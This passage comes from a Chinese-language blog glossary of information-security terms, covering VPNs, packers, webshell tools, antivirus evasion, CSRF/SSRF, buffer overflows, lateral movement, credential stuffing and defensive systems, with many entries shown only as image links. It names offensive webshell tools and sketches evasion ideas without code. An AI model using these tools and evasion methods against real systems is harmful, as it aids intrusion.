src="/2023/11/19/%E4%BF%A1%E5%AE%89%E6%9C%AF%E8%AF%AD/image33.png"></p><p>说明：站点对站点意味着两端或者多端的地点相对固定，链接不间断。一个数据包发送到VPN集线器的时候，数据包上的源地址会被更改为当前VPN集线器的地址，而目的地址会被改为目的VPN集线器的地址，这个数据包会被加密，在中间人看来就只是这两个集线器之间在进行通信，而且数据就已经被加密了，这样就隐藏了实际源地址和实际目标地址</p><p>·客户端对站点 &#x2F; 远程登录VPN</p><p><img src="/2023/11/19/%E4%BF%A1%E5%AE%89%E6%9C%AF%E8%AF%AD/image34.png"></p><p>说明：一般来说此类型的VPN可以用浏览器直接通信(前提是浏览器可以进行VPN功能)，也可以另外安装客户端软件来进行VPN通信，而且此种类型的VPN具有全隧道和半隧道两种模式</p><p>·全隧道：所有网络数据都走公司网</p><p>·半隧道：部分数据走公司网</p><p>——VPN职责：保密、认证、完整</p><p><img src="/2023/11/19/%E4%BF%A1%E5%AE%89%E6%9C%AF%E8%AF%AD/image35.png"></p><p><img src="/2023/11/19/%E4%BF%A1%E5%AE%89%E6%9C%AF%E8%AF%AD/image36.png"></p><p><img src="/2023/11/19/%E4%BF%A1%E5%AE%89%E6%9C%AF%E8%AF%AD/image37.png"></p><p><img src="/2023/11/19/%E4%BF%A1%E5%AE%89%E6%9C%AF%E8%AF%AD/image38.png"></p><p>——VPN主要使用的两大框架：IPsec框架 和 SSL&#x2F;TLS框架</p><p>说明：VPN职责的实现需要结合很多协议，网络通信本来就是一堆协议组合而成的，而一堆协议又可以组成一个框架</p><p><img src="/2023/11/19/%E4%BF%A1%E5%AE%89%E6%9C%AF%E8%AF%AD/image39.png"></p><p>·客户端-站点类型VPN多使用SSL&#x2F;TLS框架</p><p><img src="/2023/11/19/%E4%BF%A1%E5%AE%89%E6%9C%AF%E8%AF%AD/image40.png"></p><p><img src="/2023/11/19/%E4%BF%A1%E5%AE%89%E6%9C%AF%E8%AF%AD/image41.png"></p><p>(补充，SSL和TLS)</p><p><img src="/2023/11/19/%E4%BF%A1%E5%AE%89%E6%9C%AF%E8%AF%AD/image42.png"></p><p>·站点-站点类型VPN多使用IPsec框架【但IPsec框架实质上即可以用在客户端-站点，也可以用在站点-站点】</p><p><img src="/2023/11/19/%E4%BF%A1%E5%AE%89%E6%9C%AF%E8%AF%AD/image43.png"></p><p><img src="/2023/11/19/%E4%BF%A1%E5%AE%89%E6%9C%AF%E8%AF%AD/image44.png"></p><p>使用VPN请求流程图：</p><p><img src="/2023/11/19/%E4%BF%A1%E5%AE%89%E6%9C%AF%E8%AF%AD/image45.png"></p><p>50.关于PEID：全称PE Identifier，是一款著名的查壳工具</p><p>51.关于脱壳和加壳：</p><p><img src="/2023/11/19/%E4%BF%A1%E5%AE%89%E6%9C%AF%E8%AF%AD/image46.png"></p><p><img src="/2023/11/19/%E4%BF%A1%E5%AE%89%E6%9C%AF%E8%AF%AD/image47.png"></p><p><img src="/2023/11/19/%E4%BF%A1%E5%AE%89%E6%9C%AF%E8%AF%AD/image48.png"></p><p>注：除此之外捆绑壳、伪装壳、多层壳等</p><p>52.关于IDC语言：</p><p><img src="/2023/11/19/%E4%BF%A1%E5%AE%89%E6%9C%AF%E8%AF%AD/image49.png"></p><p>53.关于脏数据和脏读：</p><p>·脏数据：从目标中取出的数据已经过期、错误或者没有意义，这种数据就叫做脏数据</p><p>·脏读：将脏数据读取出来即为脏读</p><p>脏读案例：在并发访问的情况下，不同的事务对相同的数据进行操作，在事务A修改数据还未提交的时候，事务B对该数据进行读取，读出了事物A修改过后的数据，但是事物A最终没有提交，这种情况就是数据库中的脏读情况</p><p>(补充，幻读)：第一个事务对一个表中的数据进行了修改，这种修改涉及到表中的全部数据行。同时，第二个事务也修改这个表中的数据，这种修改是向表中插入一行新数据。那么，以后就会发生操作第一个事务的用户发现表中还有没有修改的数据行，就好像发生了幻觉一样</p><p>幻读案例：目前工资为5000的员工有10人，事务A读取所有工资为5000的人数为10人。<br>此时，事务B插入一条工资也为5000的记录。这时，事务A再次读取工资为5000的员工，记录为11人。此时产生了幻读</p><p>54.关于perl语言：</p><p><img src="/2023/11/19/%E4%BF%A1%E5%AE%89%E6%9C%AF%E8%AF%AD/image50.png"></p><p>基本介绍：</p><p><img src="/2023/11/19/%E4%BF%A1%E5%AE%89%E6%9C%AF%E8%AF%AD/image51.png"></p><p><img src="/2023/11/19/%E4%BF%A1%E5%AE%89%E6%9C%AF%E8%AF%AD/image52.png"></p><p>注：Perl脚本的惯用后缀名是”.pl”，除了”.pl”，Perl脚本还可以使用其他后缀名，如”.pm”、”.cgi”、”.plx”等。其中，”.pm”后缀通常用于Perl模块文件，”.cgi”后缀通常用于CGI脚本文件，”.plx”后缀通常用于使用Perl Compiler编译的可执行文件</p><p>Perl脚本的执行方式：</p><p>·perl xxx.pl</p><p>·修改xxx.pl后缀为.cgi，赋予可执行权限后，双击&#x2F;调用即可执行</p><p><img src="/2023/11/19/%E4%BF%A1%E5%AE%89%E6%9C%AF%E8%AF%AD/image53.png"></p><p>55.关于IM：即时通信(Instant Message)是指能够即时发送和接收互联网消息等的业务【功能应用如：电子邮件、博客、音乐、电视、QQ、微信等】</p><p>56.关于挂钩：在计算机安全领域，挂钩（Hook）是指通过在系统或应用程序中插入代码来截获、修改或扩展系统或应用程序的行为的技术。在免杀技术中，挂钩通常用于欺骗安全软件，使其无法检测到恶意代码的存在</p><p>57.关于核晶防护：”核晶防护”在计算机安全领域中通常是指芯片安全的一种技术措施。核晶防护旨在保护芯片内部的核心部分（即核晶）免受各种攻击和侵入，防止攻击者利用漏洞或物理手段获取芯片中的敏感信息或控制芯片的行为</p><p>58.常用Webshell工具：</p><p>·中国菜刀(caidao&#x2F;Chinaknife)</p><p>·蚁剑(AntSword)</p><p>·冰蝎(Behinder)</p><p>·哥斯拉(godzila)</p><p>59.关于暗链：暗链（Dark Link）是指一种存在于网站页面内的、不易被察觉的、指向其他网站的超链接。这些链接通常被隐藏在页面的源代码或者图片等媒体资源中，用户很难发现它们的存在。暗链的存在可能是恶意网站的一种手段，用于引导用户访问包含恶意软件或者欺诈信息的其他网站，或者用于提高其他网站的搜索引擎排名。暗链也可能会被黑客用于攻击，例如通过钓鱼攻击来窃取用户的个人信息或者登录凭证</p><p>60.关于免杀：免杀就是反病毒(AntiVirus)与反间谍(AntiSpyware)的对⽴⾯，英文为</p><p>Anti-AntiVirus(简写Virus AV)，可翻译为“反-反病毒技术”“反杀毒技术”</p><p>61.关于静态查杀和动态查杀：</p><p><img src="/2023/11/19/%E4%BF%A1%E5%AE%89%E6%9C%AF%E8%AF%AD/image54.png"></p><p>62.关于OA：OA是Office Automation（办公自动化）的缩写，通常指的是企业或机构内部的信息化管理系统，旨在提高办公效率和管理水平。OA系统通常包括各种管理和协作工具，例如文档管理、流程管理、日程管理、邮件通讯、会议管理、人力资源管理等，以及相应的数据分析和报表生成功能。OA系统可以帮助企业或机构优化内部流程，提高工作效率和管理水平，促进信息共享和协作，提高工作质量和效益。常见的OA软件有致远OA、用友NC、蓝凌OA、红帆OA、华天动力OA、万户OA、金蝶云、协众OA等</p><p>63.关于fastjson：fastjson是一种Java语言下的JSON（JavaScript Object Notation）解析器和生成器，它能够将Java对象转换成JSON格式的字符串，也能够将JSON格式的字符串转换成Java对象。它是阿里巴巴开发的一款开源的JSON处理工具，具有性能高、易用性好、功能丰富等特点，被广泛应用于各种Java应用程序中。fastjson支持自动类型推断、注解、泛型、反射等特性，可以有效地提高开发效率和代码质量</p><p>64.关于回滚：回滚是指将计算机系统、软件或数据恢复到之前的一个时间点或状态。通常，回滚是由于某个操作或事件导致系统或数据出现错误或不稳定，需要恢复到之前的一个可靠状态。回滚可以通过备份、镜像、快照等技术来实现。在软件开发中，回滚也指撤销之前的代码修改，恢复到之前的一个稳定版本</p><p>65.关于DNSlog：首先我们知道DNS是起ip与域名的解析的服务，通过ip可以解析到对应的域名。DNSlog就是储存在DNS上的域名相关的信息，它记录着你对域名或者IP的访问信息，也就是类似于日志文件</p><p>66.关于CEYE：CEYE是一个用来检测带外（Out-of-Band）流量的监控平台，如DNS查询和HTTP请求。它可以帮助安全研究人员在测试漏洞时收集信息（例如SSRF &#x2F; XXE &#x2F; RFI &#x2F; RCE）</p><p>67.关于token：token通常称为令牌。最简单的token组成:uid(用户唯一的身份标识)、time(当前时间的时间戳)、sign(签名，由token的前几位+哈希算法压缩成一定长的十六进制字符串，可以防止恶意第三方拼接token请求服务器)。还可以把不变的参数也放进token，避免多次查库</p><p>(补充，token与cookie对比)</p><p>68.关于JWT：</p><p><img src="/2023/11/19/%E4%BF%A1%E5%AE%89%E6%9C%AF%E8%AF%AD/image55.png"></p><p>69.关于.cfg文件：</p><p><img src="/2023/11/19/%E4%BF%A1%E5%AE%89%E6%9C%AF%E8%AF%AD/image56.png"></p><p>70.关于CMS：</p><p><img src="/2023/11/19/%E4%BF%A1%E5%AE%89%E6%9C%AF%E8%AF%AD/image57.png"></p><p>注：常见的 CMS 系统包括 WordPress、Joomla、Drupal、Typecho等</p><p>(补充，CMS和OA对比)</p><p><img src="/2023/11/19/%E4%BF%A1%E5%AE%89%E6%9C%AF%E8%AF%AD/image58.png"></p><p>71.关于leet&#x2F;leetspeak：Leet（英文中亦称 leetspeak 或 eleet。Leet拼写法：L337, 3L337, 31337或1337），又称黑客文，是指一种发源于西方国家的BBS、在线游戏和黑客社群所使用的文字书写方式。通常是把拉丁字母转变成数字或是特殊符号，例如E写成3、A写成@等。或是将单字写成同音的字母或数字，如to写成2、for写成4等等【flag—&gt;f14g】</p><p><img src="/2023/11/19/%E4%BF%A1%E5%AE%89%E6%9C%AF%E8%AF%AD/image59.png"></p><p>72.关于CSRF和SSRF：</p><p>CSRF</p><p><img src="/2023/11/19/%E4%BF%A1%E5%AE%89%E6%9C%AF%E8%AF%AD/image60.png"></p><p>SSRF</p><p><img src="/2023/11/19/%E4%BF%A1%E5%AE%89%E6%9C%AF%E8%AF%AD/image61.png"></p><p>总结</p><p>CSRF是服务器端没有对用户提交的数据进行严格的把控，导致攻击者可以利用用户的Cookie信息伪造用户请求发送至服务器。而SSRF是服务器对用户提供的可控URL地址过于信任，没有经过严格检测，导致攻击者可以以此为跳板攻击内网或其他服务器</p><p>73.关于安迪-比尔定律：</p><p><img src="/2023/11/19/%E4%BF%A1%E5%AE%89%E6%9C%AF%E8%AF%AD/image62.png"></p><p>74.关于摩尔定律：</p><p><img src="/2023/11/19/%E4%BF%A1%E5%AE%89%E6%9C%AF%E8%AF%AD/image63.png"></p><p>75.关于Raw镜像：</p><p><img src="/2023/11/19/%E4%BF%A1%E5%AE%89%E6%9C%AF%E8%AF%AD/image64.png"></p><p>76.关于图床：图床是一种在线图像存储服务，它允许用户上传图片并生成一个链接，以便在其他网站或社交媒体上共享或嵌入这些图片。图床可以用于节省网站或博客的存储空间，同时可以提高页面加载速度，因为图片可以从外部服务器加载，而无需在本地服务器上存储和处理</p><p><img src="/2023/11/19/%E4%BF%A1%E5%AE%89%E6%9C%AF%E8%AF%AD/image65.png"></p><p>77关于云：</p><p>云计算</p><p><img src="/2023/11/19/%E4%BF%A1%E5%AE%89%E6%9C%AF%E8%AF%AD/image66.png"></p><p>云函数</p><p><img src="/2023/11/19/%E4%BF%A1%E5%AE%89%E6%9C%AF%E8%AF%AD/image67.png"></p><p>(补充，云函数和云服务器的对比)</p><p><img src="/2023/11/19/%E4%BF%A1%E5%AE%89%E6%9C%AF%E8%AF%AD/image68.png"></p><p><img src="/2023/11/19/%E4%BF%A1%E5%AE%89%E6%9C%AF%E8%AF%AD/image69.png"></p><p>云上攻防</p><p><img src="/2023/11/19/%E4%BF%A1%E5%AE%89%E6%9C%AF%E8%AF%AD/image70.png"></p><p>78.关于AP：即Access Point，译作无线接入点，是一个通过无线局域网（WLAN）连接设备与网络的设备。它通常连接到有线网络中，可以为多个设备提供无线网络连接</p><p>(补充，AP和路由器的关系)</p><p><img src="/2023/11/19/%E4%BF%A1%E5%AE%89%E6%9C%AF%E8%AF%AD/image71.png"></p><p>79.关于磁力下载和种子下载：</p><p>种子下载：种子下载是通过下载一个种子文件来获取文件的，这个种子文件包含了文件的元数据信息，例如文件的名称、大小、哈希值等等。通过种子文件，下载软件可以找到文件所在的文件夹或者服务器，并且开始下载文件。在种子下载中，文件本身并不会立即下载，而是通过种子文件来确定文件的位置和下载方式</p><p>磁力下载：磁力下载则是通过磁力链接来获取文件的，磁力链接也包含了文件的元数据信息，类似于种子文件。但不同于种子下载，磁力下载不需要下载种子文件，而是直接使用磁力链接来获取文件。通过磁力链接，下载软件可以找到文件所在的服务器，并且开始下载文件</p><p>80.关于Rootkit：</p><p><img src="/2023/11/19/%E4%BF%A1%E5%AE%89%E6%9C%AF%E8%AF%AD/image72.png"></p><p>(补充，Rootkit、混淆器、壳对比)</p><p><img src="/2023/11/19/%E4%BF%A1%E5%AE%89%E6%9C%AF%E8%AF%AD/image73.png"></p><p>81.关于挂马：</p><p><img src="/2023/11/19/%E4%BF%A1%E5%AE%89%E6%9C%AF%E8%AF%AD/image74.png"></p><p>82.关于缓冲区溢出：</p><p><img src="/2023/11/19/%E4%BF%A1%E5%AE%89%E6%9C%AF%E8%AF%AD/image75.png"></p><p>简单理解： 攻击者向一个地址区输入这个区间存储不下的大量字符。在某些情况下，这些多余的字符可以作为“执行代码”来运行，因此足以使攻击者不受安全措施限制而获得计算机的控制权</p><p>83.关于SYN攻击：</p><p><img src="/2023/11/19/%E4%BF%A1%E5%AE%89%E6%9C%AF%E8%AF%AD/image76.png"></p><p>(补充，SYN攻击和DoS攻击对比)：</p><p><img src="/2023/11/19/%E4%BF%A1%E5%AE%89%E6%9C%AF%E8%AF%AD/image77.png"></p><p>(补充，SYN攻击和CC攻击对比)：</p><p><img src="/2023/11/19/%E4%BF%A1%E5%AE%89%E6%9C%AF%E8%AF%AD/image78.png"></p><p>注：SYN攻击和CC攻击都属于DDOS攻击的一种</p><p>84.关于花指令：</p><p><img src="/2023/11/19/%E4%BF%A1%E5%AE%89%E6%9C%AF%E8%AF%AD/image79.png"></p><p>简单理解： 通过加入不影响程序功能的多余汇编指令，使得杀毒软件不能正常的判断病毒文件的构造。说通俗点就是“杀毒软件是从头到脚按顺序来识别病毒”。如果我们把病毒的头和脚颠倒位置，杀毒软件就找不到病毒了</p><p>85.关于鱼叉攻击和钓鲸攻击：</p><p><img src="/2023/11/19/%E4%BF%A1%E5%AE%89%E6%9C%AF%E8%AF%AD/image80.png"></p><p>86.关于APT攻击：</p><p><img src="/2023/11/19/%E4%BF%A1%E5%AE%89%E6%9C%AF%E8%AF%AD/image81.png"></p><p>87.关于C2：</p><p><img src="/2023/11/19/%E4%BF%A1%E5%AE%89%E6%9C%AF%E8%AF%AD/image82.png"></p><p>88.关于横移、无协议摆渡：</p><p>横移</p><p>横向移动（Lateral Movement）指的是攻击者在目标网络中移动的行为，主要是通过获取当前被攻击系统的访问权限（如用户名和密码），然后利用这些权限来尝试访问其他系统、服务或资源，从而实现对目标网络的深度渗透和控制。常见的横向移动技术包括使用远程桌面协议（RDP）、SSH、Windows管理工具等远程管理工具、利用系统漏洞获取权限、使用各种网络协议进行攻击等【指攻击者入侵后，从立足点在内部网络进行拓展，搜寻控制更多的系统】</p><p>无协议摆渡</p><p><img src="/2023/11/19/%E4%BF%A1%E5%AE%89%E6%9C%AF%E8%AF%AD/image83.png"></p><p>横移和无协议摆渡对比</p><p><img src="/2023/11/19/%E4%BF%A1%E5%AE%89%E6%9C%AF%E8%AF%AD/image84.png"></p><p>89.关于黑页：黑客攻击成功后，在网站上留下的黑客入侵成功的页面，用于炫耀攻击成果</p><p>90.关于撞库、脱库：拖库是指黑客盗取了网站的数据库。 撞库是指黑客用拖库获得的用户名和密码在其它网站批量尝试登陆，进而盗取更有价值的东西【由于一些用户在多个网站用相同的用户名和密码，所以撞库是有一定成功率的】</p><p>91关于ham：直译为“火腿”，是无线电发烧友的代称</p><p>92.关于LotL攻击：全称Living off the Land，中文可译为“靠山吃山”，是一种网络攻击理念，即借助被攻击机上的工具，通过巧用、滥用，实现攻击的目的</p><p>93.关于opcode：</p><p><img src="/2023/11/19/%E4%BF%A1%E5%AE%89%E6%9C%AF%E8%AF%AD/image85.png"></p><p>注：操作码是机器码的一部分，比汇编语言更底层</p><p>(补充，机器码的组成部分)：</p><p><img src="/2023/11/19/%E4%BF%A1%E5%AE%89%E6%9C%AF%E8%AF%AD/image86.png"></p><p>94.关于AST、SAST、DAST、IAST：</p><p>AST：AST（Application Security Test，应用安全测试）是一种用于检测应用程序安全漏洞的测试技术。AST可以涵盖多种不同的测试方法和技术，包括静态代码分析（SAST）、动态应用程序安全测试（DAST）、交互式应用程序安全测试（IAST）等</p><p><img src="/2023/11/19/%E4%BF%A1%E5%AE%89%E6%9C%AF%E8%AF%AD/image87.png"></p><p>SAST：SAST（静态应用程序安全测试）是一种应用程序安全测试技术，用于检测应用程序源代码中的潜在安全漏洞。SAST技术通过分析应用程序的源代码或编译后的二进制代码，查找诸如代码注入、SQL注入、跨站点脚本（XSS）攻击、跨站点请求伪造（CSRF）攻击、不安全的加密实现等潜在的安全漏洞。SAST技术是静态分析技术的一种，不需要执行应用程序，可以在应用程序发布之前进行测试，从而帮助开发人员在代码中找到并修复漏洞</p><p>DAST：DAST（动态应用程序安全测试）是一种应用程序安全测试技术，用于检测应用程序在运行时可能存在的安全漏洞。DAST技术通过模拟攻击者的行为对应用程序进行测试，以查找潜在的安全漏洞和问题，如SQL注入、跨站点脚本（XSS）攻击、跨站点请求伪造（CSRF）攻击等。DAST技术是动态分析技术的一种，需要执行应用程序，可以模拟攻击者的行为，从而更加接近实际的攻击情况</p><p>IAST：IAST（交互式应用程序安全测试）是一种应用程序安全测试技术，结合了SAST和DAST技术，可以在运行时对应用程序进行测试。IAST技术通过在应用程序运行时插入代码来监视运行时行为，从而可以检测到更多的安全漏洞和问题。IAST技术可以结合SAST和DAST技术的优点，既可以检测应用程序源代码中的漏洞，也可以检测应用程序在运行时可能存在的漏洞</p><p>95.关于EDR系统：</p><p><img src="/2023/11/19/%E4%BF%A1%E5%AE%89%E6%9C%AF%E8%AF%AD/image88.png"></p><p>96.关于黑玫瑰分享法则：</p><p><img src="/2023/11/19/%E4%BF%A1%E5%AE%89%E6%9C%AF%E8%AF%AD/image89.png"></p><p>97.关于删站：</p><p><img src="/2023/11/19/%E4%BF%A1%E5%AE%89%E6%9C%AF%E8%AF%AD/image90.png"></p><p>个人理解：删站通常是指将网站的代码、数据库、文件等全部删除或关闭，从而使网站无法访问或使用。这种情况下，通过访问网站的URL或IP地址，用户将无法访问该网站的任何内容，因为它已经被彻底从互联网上删除。需要注意的是，删站不仅仅是删除网站的代码和文件，还包括取消网站的域名、关闭服务器、清除备份等操作。因此，在进行删站操作时，需要谨慎处理，以免误删或造成不可逆的损失。同时，如果是因为违反相关法律法规或服务协议而需要关闭网站，也应当遵守相关规定，以免产生负面影响或法律责任</p><p>98.关于IDS、IPS：</p><p>IDS</p><p><img src="/2023/11/19/%E4%BF%A1%E5%AE%89%E6%9C%AF%E8%AF%AD/image91.png"></p><p>注：入侵检测系统IDS用于在黑客发起进攻或是发起进攻之前检测到攻击，并加以拦截。IDS是不同于防火墙。防火墙只能屏蔽入侵，而IDS却可以在入侵发生以前，通过一些信息来检测到即将发生的攻击或是入侵并作出反应</p><p>(补充)</p><p>IDS通常分为主机型IDS和网络型IDS两种：</p><p>·主机型IDS(又称HIDS)：运行在单个主机上，监测和识别该主机上的入侵行为和安全威胁，例如恶意软件、漏洞利用、文件篡改等</p><p>·网络型IDS(又称NIDS)：运行在网络上，监测和识别网络中的入侵行为和安全威胁，例如网络扫描、端口扫描、嗅探、DoS攻击、入侵尝试等</p><p>IPS</p><p><img src="/2023/11/19/%E4%BF%A1%E5%AE%89%E6%9C%AF%E8%AF%AD/image92.png"></p><p>99.关于防毒墙、反病毒网关：</p><p>防毒墙</p><p><img src="/2023/11/19/%E4%BF%A1%E5%AE%89%E6%9C%AF%E8%AF%AD/image93.png"></p><p>反病毒网关</p><p><img src="/2023/11/19/%E4%BF%A1%E5%AE%89%E6%9C%AF%E8%AF%AD/image94.png"></p><p>防毒墙和反病毒网关对比</p><p><img src="/2023/11/19/%E4%BF%A1%E5%AE%89%E6%9C%AF%E8%AF%AD/image95.png"></p><p>100.关于告警：指网络安全设备对攻击行为产生的警报</p><p>101.关于NAC：</p><p><img src="/2023/11/19/%E4%BF%A1%E5%AE%89%E6%9C%AF%E8%AF%AD/image96.png"></p><p>个人理解：NAC全称为Network Access Control，即网络准入控制，其宗旨是防止病毒和蠕虫等新兴黑客技术对企业安全造成危害。借助NAC，客户可以只允许合法的、值得信任的终端设备（例如PC、服务器、PDA）接入网络，而不允许其它设备接入</p><p>102.关于UTM：</p><p><img src="/2023/11/19/%E4%BF%A1%E5%AE%89%E6%9C%AF%E8%AF%AD/image97.png"></p><p>103.关于堡垒机：</p><p><img src="/2023/11/19/%E4%BF%A1%E5%AE%89%E6%9C%AF%E8%AF%AD/image98.png"></p><p>104.关于蜜罐：蜜罐（Honeypot）是一个包含漏洞的系统，它摸拟一个或多个易受攻击的主机，给黑客提供一个容易攻击的目标。由于蜜罐没有其它任务需要完成，因此所有连接的尝试都应被视为是可疑的。蜜罐的另一个用途是拖延攻击者对其真正目标的攻击，让攻击者在蜜罐上浪费时间。蜜罐类产品包括蜜网、蜜系统、蜜账号等</p><p>105.关于应急响应、态势感知：</p><p>应急响应</p><p>应急响应是指针对网络安全事件和攻击，采取及时和有效的措施，以最小化损失和影响的过程。在网络安全领域，应急响应通常是指响应网络安全事件和攻击，包括网络入侵、数据泄露、恶意软件感染等</p><p>态势感知</p><p>态势感知（Situation Awareness）是指在网络安全领域中，对网络安全态势进行实时监测、分析和评估，及时发现和处理安全事件和威胁的能力。态势感知可以帮助企业或组织对网络安全威胁做出快速反应，以保障网络安全运行</p><p>106.关于探针：探针（Probe）是指一种用于监测和收集网络数据的工具或设备，可以用于收集各种网络数据，如网络流量、应用程序数据、性能数据等。探针可以帮助网络管理员更好地了解网络的运行情况和性能状况，发现和解决网络问题</p><p>个人理解：可以简单理解为赛博世界的摄像头，部署在网络拓扑的关键节点上，用于收集和分析流量和日志，发现异常行为，并对可能到来的攻击发出预警</p><p>107.关于SRC：SRC是安全响应中心（Security Response Center）的缩写。SRC 是一个专门负责网络安全事务的组织，通常由网络安全厂商、互联网服务提供商、政府机构等单位设立和运营。其主要职责包括响应网络安全事件、提供安全咨询和技术支持、开展安全培训和演练等。SRC 在网络安全中扮演着重要的角色，可以协助组织和企业及时发现和解决网络安全事件，提高网络安全的防御和应对能力，保护用户和企业的网络安全</p><p>(补充，公益SRC)：公益SRC是白帽子随机发现的漏洞提交漏洞盒子平台，平台对漏洞审核后通知企业认领。厂商注册公益SRC成功后即可认领漏洞，公益SRC服务不收取企业任何费用</p><p>108.关于风控安全：风控安全（Risk Control Security）是指通过识别、分析和管理潜在的风险，保护信息系统和数据资产免受各种安全威胁和攻击的影响</p><p>109.关于2FA：2FA是指两步验证（Two-Factor Authentication），通常是指在用户登录时要求用户提供两种不同的验证方式，以增加安全性。2FA通常需要用户提供密码以及另外一种验证方式，如短信验证码、动态口令、指纹识别等</p><p>110.关于兔子洞：兔子洞(rabbit hole)源于著名童话书《爱丽丝漫游奇境记》，现在用于比喻未知、不确定的世界。领域内师傅常说的going down the rabbit hole即表示“掉入未知世界”</p><p>111.关于语料库：</p><p><img src="/2023/11/19/%E4%BF%A1%E5%AE%89%E6%9C%AF%E8%AF%AD/image99.png"></p><p><img src="/2023/11/19/%E4%BF%A1%E5%AE%89%E6%9C%AF%E8%AF%AD/image100.png"></p><p>112.关于CDN：</p><p><img src="/2023/11/19/%E4%BF%A1%E5%AE%89%E6%9C%AF%E8%AF%AD/image101.png"></p><p>113.关于幂等：</p><p><img src="/2023/11/19/%E4%BF%A1%E5%AE%89%E6%9C%AF%E8%AF%AD/image102.png"></p><p>114.关于 CLI tools和GUI tools：CLI tools指的是命令行工具，GUI tools指的是图形化工具【CLI（Command Line Interface）是指命令行界面，GUI 指的是 Graphical User Interface，即图形用户界面】</p><p>115.关于软解码和硬解码：软解码是通过软件让CPU来对视频进行解码处理，而硬解码是通过专用的子卡设备或者显卡核心GPU来对视频进行解码处理。软解码的优点是画质效果比较好，缺点是会增加CPU负担，导致发热和耗电。硬解码的优点是播放流畅，低功耗，缺点是画质效果比软解码略差一点，而且受视频格式的限制</p><p>(补充，视频不能拖动进度条什么原因)</p><p><img src="/2023/11/19/%E4%BF%A1%E5%AE%89%E6%9C%AF%E8%AF%AD/image103.png"></p><p>116.关于NIP：NIP是指网络入侵防御系统（Network Intrusion Prevention System），是一种网络安全设备，用于检测和防止网络攻击</p><p>117.关于FAQ：</p><p><img src="/2023/11/19/%E4%BF%A1%E5%AE%89%E6%9C%AF%E8%AF%AD/image104.png"></p><p>118.关于LFI漏洞：LFI（Local File Inclusion）漏洞是一种常见的Web安全漏洞，可译为“本地文件包含漏洞”，它允许攻击者通过Web应用程序访问服务器上的文件。LFI漏洞通常是由于程序员未对用户可控变量进行输入检查而导致的，这可能会导致泄露服务器上的敏感文件等</p><p>补充：关于RFI漏洞</p><p><img src="/2023/11/19/%E4%BF%A1%E5%AE%89%E6%9C%AF%E8%AF%AD/image105.png"></p><p>119.关于GNU ：”GNU”代表”GNU’sNotUnix”（GNU不是Unix）。GNU是一个自由软件运动的项目，旨在开发一个类Unix操作系统。它由理查德·斯托曼（RichardStallman）于1983年发起，并由自由软件基金会（FreeSoftwareFoundation）支持。GNU的目标是创建一个完全自由、开源的操作系统，使用户能够自由地运行、复制、分发、学习和改进软件。为了实现这一目标，GNU项目开发了许多自由软件工具和应用程序，包括编译器、文本编辑器(如GNU nano)、操作系统内核等</p><p>120.关于RASP：</p><p><img src="/2023/11/19/%E4%BF%A1%E5%AE%89%E6%9C%AF%E8%AF%AD/image106.png"></p><p><img src="/2023/11/19/%E4%BF%A1%E5%AE%89%E6%9C%AF%E8%AF%AD/image107.png"></p><p>说明：在2014年的时候，Gartner引入了“Runtime application self-protection”一词，简称为RASP。它是一种新型应用安全保护技术，它将保护程序像疫苗一样注入到应用程序中，应用程序融为一体，能实时检测和阻断安全攻击，使应用程序具备自我保护能力，当应用程序遭受到实际攻击伤害，就可以自动对其进行防御，而不需要进行人工干预</p><p>RASP与防火墙的比较：</p><p><img src="/2023/11/19/%E4%BF%A1%E5%AE%89%E6%9C%AF%E8%AF%AD/image108.png"></p><p>参考文章：<a href="https://blog.csdn.net/tony_vip/article/details/106006030">https://blog.csdn.net/tony_vip/article/details/106006030</a></p><p>121.关于高端口和低端口：</p><p><img src="/2023/11/19/%E4%BF%A1%E5%AE%89%E6%9C%AF%E8%AF%AD/image109.png"></p><p>注：习惯表述上，低端口为0~1024，此外均为高端口</p><p>122.关于AICG：</p><p><img src="/2023/11/19/%E4%BF%A1%E5%AE%89%E6%9C%AF%E8%AF%AD/image110.png"></p><p>123.关于通杀漏洞：</p><p><img src="/2023/11/19/%E4%BF%A1%E5%AE%89%E6%9C%AF%E8%AF%AD/image111.png"></p><p>124.关于foo：</p><p><img src="/2023/11/19/%E4%BF%A1%E5%AE%89%E6%9C%AF%E8%AF%AD/image112.png"></p><p><img src="/2023/11/19/%E4%BF%A1%E5%AE%89%E6%9C%AF%E8%AF%AD/image113.png"></p><p>125.关于boot2root：</p><p><img src="/2023/11/19/%E4%BF%A1%E5%AE%89%E6%9C%AF%E8%AF%AD/image114.png"></p><p>126.关于互联网侧、城市侧、政务网：</p><p>互联网侧</p><p><img src="/2023/11/19/%E4%BF%A1%E5%AE%89%E6%9C%AF%E8%AF%AD/image115.png"></p><p>城市侧</p><p><img src="/2023/11/19/%E4%BF%A1%E5%AE%89%E6%9C%AF%E8%AF%AD/image116.png"></p><p>政务网</p><p><img src="/2023/11/19/%E4%BF%A1%E5%AE%89%E6%9C%AF%E8%AF%AD/image117.png"></p><p>127.关于网站SEO分析：网站SEO分析是对一个网站进行搜索引擎优化（SEO）方面的评估和分析的过程。它旨在确定网站在搜索引擎结果页面（SERP）中的排名和可见性，并提供改善网站排名的建议和策略</p><p>128.关于政务云：政务云是指专门为政府机关和公共部门提供的云计算服务平台。它是基于云计算技术构建的、满足政府需求的安全、可靠、高效的信息化基础设施</p><p>129.关于CDP模式：</p><p><img src="/2023/11/19/%E4%BF%A1%E5%AE%89%E6%9C%AF%E8%AF%AD/image118.png"></p><p><img src="/2023/11/19/%E4%BF%A1%E5%AE%89%E6%9C%AF%E8%AF%AD/image119.png"></p><p>注：Cisco，即思科（Cisco Systems, Inc.）。思科是一家全球领先的网络技术公司，提供广泛的网络设备和解决方案，包括路由器（routers）、交换机（switches）、防火墙（firewalls）、无线网络设备（wireless devices）、网络存储设备（network storage devices）等</p><p>130.关于ECS：</p><p><img src="/2023/11/19/%E4%BF%A1%E5%AE%89%E6%9C%AF%E8%AF%AD/image120.png"></p><p>131.关于CNAME记录、A记录：</p><p>CNAME记录</p><p><img src="/2023/11/19/%E4%BF%A1%E5%AE%89%E6%9C%AF%E8%AF%AD/image121.png"></p><p><img src="/2023/11/19/%E4%BF%A1%E5%AE%89%E6%9C%AF%E8%AF%AD/image122.png"></p><p>A记录</p><p><img src="/2023/11/19/%E4%BF%A1%E5%AE%89%E6%9C%AF%E8%AF%AD/image123.png"></p><p><img src="/2023/11/19/%E4%BF%A1%E5%AE%89%E6%9C%AF%E8%AF%AD/image124.png"></p><p>(补充，其他DNS记录类型)</p><p><img src="/2023/11/19/%E4%BF%A1%E5%AE%89%E6%9C%AF%E8%AF%AD/image125.png"></p><p>132.关于ATT&amp;CK矩阵模型：</p><p><img 